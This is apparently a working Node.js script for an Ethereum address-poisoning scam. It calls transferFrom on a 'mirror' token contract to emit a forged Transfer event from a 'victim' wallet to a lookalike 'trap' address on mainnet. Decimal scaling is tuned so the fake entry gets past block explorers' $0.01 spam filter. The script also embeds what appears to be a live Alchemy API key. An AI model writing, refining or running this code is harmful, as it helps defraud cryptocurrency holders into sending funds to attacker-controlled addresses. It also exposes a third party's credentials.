import 'dotenv/config';
import { createPublicClient, createWalletClient, http } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet } from 'viem/chains';

const MIRROR_TOKEN_ADDRESS = process.env.MIRROR_TOKEN_ADDRESS;
let OPERATOR_KEY = process.env.MIRROR_OPERATOR_KEY;

// ─── Fix private key formatting ───
if (!OPERATOR_KEY) {
    console.error('❌ MIRROR_OPERATOR_KEY not set in .env');
    process.exit(1);
}

OPERATOR_KEY = OPERATOR_KEY.trim();
if (!OPERATOR_KEY.startsWith('0x')) {
    OPERATOR_KEY = `0x${OPERATOR_KEY}`;
}

if (!/^0x[a-fA-F0-9]{64}$/.test(OPERATOR_KEY)) {
    console.error('❌ Invalid private key format. Expected 64 hex characters after 0x');
    console.error(`Got: ${OPERATOR_KEY.slice(0, 10)}...`);
    process.exit(1);
}

console.log(`✅ Private key format valid (${OPERATOR_KEY.slice(0, 10)}...)`);

const MIRROR_ABI = [
    {
        "inputs": [
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// ─── 🆕 DECIMAL SCALING HELPERS (port these to duster.py later) ───

/**
 * Get the correct number of decimals for a token symbol.
 * This is the source of truth for how wallets/explorers will interpret the raw amount.
 */
function getDecimals(assetSymbol) {
    const decimalsMap = {
        // Native coins (18 decimals)
        'ETH': 18,
        'WETH': 18,
        'BNB': 18,
        'WBNB': 18,
        'MATIC': 18,
        'WMATIC': 18,

        // Stablecoins with 6 decimals
        'USDC': 6,
        'USDC_NATIVE': 6,
        'USDT': 6,
        'BUSD': 6,  // Note: BSC BUSD is 18, but most stablecoins are 6

        // Stablecoins with 18 decimals
        'DAI': 18,
        'TUSD': 18,
        'FRAX': 18,
        'USDP': 18,

        // BTC variants
        'WBTC': 8,
        'renBTC': 8,
    };

    const symbol = assetSymbol.toUpperCase();
    const decimals = decimalsMap[symbol];

    if (decimals === undefined) {
        console.warn(`⚠️  Unknown token "${assetSymbol}", defaulting to 18 decimals`);
        return 18;
    }

    return decimals;
}

/**
 * Convert a human-readable amount to raw units for on-chain emission.
 * 
 * Examples:
 *   toRawAmount(500000, 'USDC')   → 500000000000n  (500k USDC)
 *   toRawAmount(1.5, 'ETH')       → 1500000000000000000n  (1.5 ETH)
 *   toRawAmount(0.25, 'WBTC')     → 25000000n  (0.25 BTC)
 */
function toRawAmount(humanAmount, assetSymbol) {
    const decimals = getDecimals(assetSymbol);
    const multiplier = 10n ** BigInt(decimals);

    // Convert to string to handle both number and string inputs
    const amountStr = String(humanAmount);

    if (amountStr.includes('.')) {
        // Decimal number like "500000.5" or "1.5"
        const [whole, frac = ''] = amountStr.split('.');
        const paddedFrac = frac.padEnd(decimals, '0').slice(0, decimals);
        const combined = whole + paddedFrac;
        return BigInt(combined);
    } else {
        // Whole number like 500000
        return BigInt(amountStr) * multiplier;
    }
}

/**
 * Format raw amount back to human-readable (for logging).
 */
function toHumanAmount(rawAmount, assetSymbol) {
    const decimals = getDecimals(assetSymbol);
    const divisor = 10 ** decimals;
    return (Number(rawAmount) / divisor).toFixed(decimals <= 8 ? decimals : 6);
}

// ─── Configure your test addresses ───
const VICTIM_ADDRESS = '0xf8cb909c54b761a4b74a5eaf23c7fec49feb9ffc';      // Wallet you control
const TRAP_ADDRESS = '0x8fa29bfb9a391895aecf81172fcc78609c167e24';        // Your trap/vanity address

// ─── 🆕 Use human-readable amount + symbol (the FIX) ───
const ASSET = 'DAI';                      // Token symbol
const HUMAN_AMOUNT = 7.11069046;               // What you want to show (500,000 USDT)
const MIRROR_AMOUNT = toRawAmount(HUMAN_AMOUNT, ASSET);  // 🆕 Properly scaled

async function test() {
    const account = privateKeyToAccount(OPERATOR_KEY);

    const publicClient = createPublicClient({
        chain: mainnet,
        transport: http('https://eth-mainnet.g.alchemy.com/v2/alch_fwNFGs-GGjZ5MauYZexOR')
    });

    const walletClient = createWalletClient({
        account,
        chain: mainnet,
        transport: http('https://eth-mainnet.g.alchemy.com/v2/alch_fwNFGs-GGjZ5MauYZexOR')
    });

    console.log(`\n🔑 Operator: ${account.address}`);
    console.log(`💰 Operator balance: ${await publicClient.getBalance({ address: account.address })} wei`);
    console.log(`📄 Contract: ${MIRROR_TOKEN_ADDRESS}`);
    console.log(`👤 Victim: ${VICTIM_ADDRESS}`);
    console.log(`🪤 Trap: ${TRAP_ADDRESS}`);

    // 🆕 Show BOTH the human amount and raw amount
    const decimals = getDecimals(ASSET);
    console.log(`\n🎯 Amount Configuration:`);
    console.log(`   Asset: ${ASSET}`);
    console.log(`   Decimals: ${decimals}`);
    console.log(`   Human amount: ${HUMAN_AMOUNT.toLocaleString()} ${ASSET}`);
    console.log(`   Raw amount: ${MIRROR_AMOUNT.toString()}`);
    console.log(`   Expected display: ${toHumanAmount(MIRROR_AMOUNT, ASSET)} ${ASSET}`);

    console.log('\n🚀 Emitting forged Transfer event...');

    const hash = await walletClient.writeContract({
        address: MIRROR_TOKEN_ADDRESS,
        abi: MIRROR_ABI,
        functionName: 'transferFrom',
        args: [VICTIM_ADDRESS, TRAP_ADDRESS, MIRROR_AMOUNT]
    });

    console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);

    const receipt = await publicClient.waitForTransactionReceipt({ hash });
    console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
    console.log(`✅ Gas used: ${receipt.gasUsed}`);
    console.log(`✅ Logs emitted: ${receipt.logs.length}`);

    // Decode the log
    const log = receipt.logs[0];
    console.log(`\n📋 Event Details:`);
    console.log(`   Contract: ${log.address}`);
    console.log(`   Topic 0 (event signature): ${log.topics[0].slice(0, 20)}...`);
    console.log(`   Topic 1 (from): 0x${log.topics[1].slice(26)}`);
    console.log(`   Topic 2 (to): 0x${log.topics[2].slice(26)}`);

    // Decode value from data
    const valueHex = log.data;
    const valueBigInt = BigInt(valueHex);
    console.log(`   Data (raw value): ${valueBigInt.toString()}`);
    console.log(`   Data (human value): ${toHumanAmount(valueBigInt, ASSET)} ${ASSET}`);

    console.log(`\n🎯 CHECK THESE LINKS:`);
    console.log(`   Victim's token history: https://etherscan.io/address/${VICTIM_ADDRESS}#tokentxns`);
    console.log(`   Trap's token history: https://etherscan.io/address/${TRAP_ADDRESS}#tokentxns`);

    // 🆕 Show verification steps
    console.log(`\n📊 VERIFICATION STEPS:`);
    console.log(`   1. Open victim's token history (link above)`);
    console.log(`   2. Wait 30-60 seconds for indexing`);
    console.log(`   3. Look for OUT transfer of ${HUMAN_AMOUNT.toLocaleString()} ${ASSET}`);
    console.log(`   4. The transfer should appear WITHOUT disabling the "$0.01 filter"`);
    console.log(`   5. If it still shows as < $0.01, the wallet is using wrong decimals`);
}

test().catch(err => {
    console.error('❌ Test failed:', err.message);
    if (err.message.includes('insufficient funds')) {
        console.error('\n💡 Your operator wallet needs ETH for gas. Send ~0.01 ETH to:',
            OPERATOR_KEY.startsWith('0x') ? 'check account.address above' : 'run test again to see address');
    }
    process.exit(1);
});